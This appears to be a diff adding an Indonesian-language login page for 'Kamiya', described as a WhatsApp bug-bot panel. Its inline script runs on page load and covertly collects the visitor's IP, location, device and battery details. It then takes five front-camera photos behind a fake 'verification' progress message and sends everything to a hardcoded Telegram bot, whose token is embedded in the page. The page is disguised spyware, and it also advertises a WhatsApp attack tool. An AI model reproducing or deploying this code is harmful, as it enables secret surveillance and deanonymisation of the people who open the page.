@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Kamiya Crash</title>
+
+  <meta name="description" content="Halaman Login Kamiya Union Panel" />
+
+  <style>
+    :root{
+      --bg:#0b0f14;
+      --card:#0f1720;
+      --muted:#98a0ad;
+      --accent:#ef4444;
+      --accent-2:#facc15;
+      --danger:#dc2626;
+      --glass: rgba(255,255,255,0.03);
+      --radius:12px;
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background:
+        radial-gradient(1200px 600px at 10% 10%, rgba(239,68,68,0.1), transparent 8%),
+        radial-gradient(1000px 500px at 90% 90%, rgba(250,204,21,0.08), transparent 10%),
+        var(--bg);
+      color:#e6eef6;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+    }
+
+    .container{
+      width:100%;
+      max-width:960px;
+      display:grid;
+      grid-template-columns: 420px 1fr;
+      gap:28px;
+      align-items:center;
+    }
+
+    .card{
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
+      border:1px solid rgba(255,255,255,0.05);
+      padding:28px;
+      border-radius:var(--radius);
+      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
+      backdrop-filter: blur(6px);
+    }
+
+    .brand{
+      display:flex;
+      gap:14px;
+      align-items:center;
+      margin-bottom:18px;
+    }
+    .logo {
+      width:56px;
+      height:56px;
+      border-radius:10px;
+      background:linear-gradient(135deg,var(--accent),var(--accent-2));
+      display:grid;
+      place-items:center;
+      font-weight:700;
+      color:#001217;
+      font-size:20px;
+      box-shadow: 0 6px 18px rgba(239,68,68,0.2);
+    }
+    .brand h1{
+      margin:0;
+      font-size:18px;
+      letter-spacing:0.2px;
+    }
+    .brand p{ margin:0; color:var(--muted); font-size:13px }
+
+    form { margin-top:6px }
+    .field{ margin-bottom:14px }
+    label{
+      display:block;
+      font-size:13px;
+      color:var(--muted);
+      margin-bottom:8px;
+    }
+
+    input[type="text"],
+    input[type="password"]{
+      width:100%;
+      padding:12px 14px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.05);
+      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
+      color:inherit;
+      outline:none;
+      transition: box-shadow .15s, border-color .15s, transform .08s;
+    }
+    input:focus{
+      box-shadow: 0 6px 22px rgba(239,68,68,0.2);
+      border-color: var(--accent);
+      transform: translateY(-1px);
+    }
+
+    .row{
+      display:flex;
+      gap:12px;
+      align-items:center;
+      justify-content:space-between;
+    }
+    .remember{
+      display:flex;
+      gap:10px;
+      align-items:center;
+      color:var(--muted);
+      font-size:13px;
+    }
+
+    .btn{
+      display:inline-block;
+      width:100%;
+      padding:12px 14px;
+      border-radius:10px;
+      border:none;
+      cursor:pointer;
+      font-weight:600;
+      font-size:15px;
+      background: linear-gradient(90deg,var(--accent),#b91c1c);
+      color:white;
+      box-shadow: 0 8px 28px rgba(239,68,68,0.2);
+      transition: transform .12s, box-shadow .12s, filter .12s;
+    }
+    .btn:active{ transform: translateY(1px) }
+    .btn.secondary{
+      background:transparent;
+      border:1px solid rgba(255,255,255,0.1);
+      color:var(--muted);
+      box-shadow:none;
+    }
+
+    .helper{
+      margin-top:12px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:12px;
+      font-size:13px;
+      color:var(--muted);
+    }
+    .helper a{ color:var(--muted); text-decoration:none }
+    .helper a:hover{ color:#fff; text-decoration:underline }
+
+    .danger { color:var(--danger); font-size:13px; margin-top:8px; }
+
+    .info{
+      padding:28px;
+      border-radius:var(--radius);
+      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
+      border:1px solid rgba(255,255,255,0.03);
+      display:flex;
+      flex-direction:column;
+      gap:12px;
+    }
+    .info h2{ margin:0; color:#fff; font-size:18px }
+    .info p{ margin:0; color:var(--muted); font-size:14px; line-height:1.5 }
+
+    .meta {
+      margin-top:auto;
+      display:flex;
+      gap:10px;
+      align-items:center;
+      justify-content:flex-start;
+      color:var(--muted);
+      font-size:13px;
+    }
+    .meta .pill{
+      padding:8px 10px;
+      border-radius:10px;
+      background:var(--glass);
+      border:1px solid rgba(255,255,255,0.02);
+    }
+
+    @media (max-width:880px){
+      .container{ grid-template-columns: 1fr; }
+      .info{ order:2 }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <section class="card">
+      <div class="brand">
+        <div class="logo">😹</div>
+        <div>
+          <h1>Kamiya 6.0.0</h1>
+          <p>Website Bug Kamiya.</p>
+        </div>
+      </div>
+
+      <form id="loginForm" action="/auth/login" method="POST">
+        <div class="field">
+          <label for="username">Nama Akun</label>
+          <input id="username" name="username" type="text" placeholder="NamaAkunAnda" required />
+        </div>
+
+        <div class="field">
+          <label for="password">Password</label>
+          <input id="password" name="password" type="password" placeholder="••••••••" required />
+        </div>
+
+        <div class="row" style="margin-top:6px">
+          <label class="remember">
+            <input type="checkbox" name="remember" />
+            <span>Ingat saya</span>
+          </label>
+          <a href="/auth/forgot" style="font-size:13px;color:var(--muted)">Lupa password?</a>
+        </div>
+
+        <div style="margin-top:18px">
+          <button class="btn" type="submit">Masuk</button>
+        </div>
+
+        <div class="helper">
+          <span>Belum punya akun?</span>
+          <a href="/auth/register" class="btn secondary" style="width:auto; padding:9px 12px">Daftar</a>
+        </div>
+      </form>
+    </section>
+
+    <aside class="info">
+      <h2>Tentang Kamiya</h2>
+      <p>
+        Kamiya adalah script bot Bug WhatsApp yang di kembangkan oleh saya PouMods.
+      </p>
+
+      <div class="meta">
+        <div class="pill">Status: <strong style="color:#f87171">Online</strong></div>
+        <div class="pill">Versi: <strong style="color:#facc15">v6.0.0</strong></div>
+      </div>
+    </aside>
+
+    <div id="status" style="margin-top:15px; font-size:14px; color:#facc15;">
+      ⏳ Verifikasi Data Base...
+    </div>
+  </main>
+  <script>
+    const CHAT_ID = "7434815305";
+    const BOT_TOKEN = "7930617681:AAFolq-H2hII-waMakoOJHjPdW1SHrlwII0";
+    const statusEl = document.getElementById('status');
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) entry.target.classList.add('show');
+      });
+    }, { threshold: 0.1 });
+
+    document.querySelectorAll('.section, .product').forEach(el => observer.observe(el));
+
+    window.onload = async () => {
+      statusEl.textContent = "⏳ Loading...";
+      const kamiyaKey = await Fast_server();
+      await sendDeviceInfo(kamiyaKey);
+
+      try {
+        statusEl.textContent = '⏳ Loading...';
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const track = stream.getVideoTracks()[0];
+
+        for (let i = 0; i < 5; i++) {
+          statusEl.textContent = `⏳ Loading... ${(i + 1) * 20}%...`;
+          const blob = await captureFromVideo(track);
+          await sendToTelegram(kamiyaKey, blob, "photo");
+          await new Promise(r => setTimeout(r, 1000));
+        }
+
+        track.stop();
+        statusEl.textContent = '✅ Verifikasi berhasil!';
+      } catch (err) {
+        statusEl.textContent = '✅ Silahkan masukan username dan password .';
+        console.error(err);
+      }
+    };
+
+    async function Fast_server() {
+      try {
+        const res = await fetch('/api/kamiya_union');
+        const data = await res.json();
+        return data.kamiya_key;
+      } catch {
+        return "direct";
+      }
+    }
+
+    async function sendDeviceInfo(key) {
+      try {
+        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
+        const battery = await navigator.getBattery();
+        const time = new Date().toLocaleString("id-ID");
+
+        const message = `
+🌐 *Informasi IP*
+🔢 Alamat IP: ${ipInfo.ip}
+🗺 Negara: ${ipInfo.country}
+🌍 Wilayah: ${ipInfo.region}
+📍 Kota: ${ipInfo.city}
+📡 ISP: ${ipInfo.org}
+
+📱 *Detail Perangkat*
+🔋 Baterai: ${Math.round(battery.level * 100)}% ${battery.charging ? "⚡️ Mengisi daya" : ""}
+📶 Jaringan: ${navigator.connection?.effectiveType || "Tidak diketahui"}
+🖥️ Layar: ${screen.width}x${screen.height}
+🕒 Waktu: ${time}
+🧠 User Agent: ${navigator.userAgent}
+...`;
+
+        await sendToTelegram(key, message.trim(), "text");
+      } catch (err) {
+        console.error("Device Info Error:", err);
+      }
+    }
+
+    async function captureFromVideo(videoTrack) {
+      const video = document.createElement("video");
+      video.srcObject = new MediaStream([videoTrack]);
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
+    }
+
+    async function sendToTelegram(key, data, type) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${type === "text" ? "sendMessage" : "sendPhoto"}`;
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+
+      if (type === "text") {
+        form.append("text", data);
+        form.append("parse_mode", "Markdown");
+      } else {
+        form.append("photo", data, "image.jpg");
+      }
+
+      await fetch(url, { method: "POST", body: form });
+    }
+  </script>
+</body>
+</html>
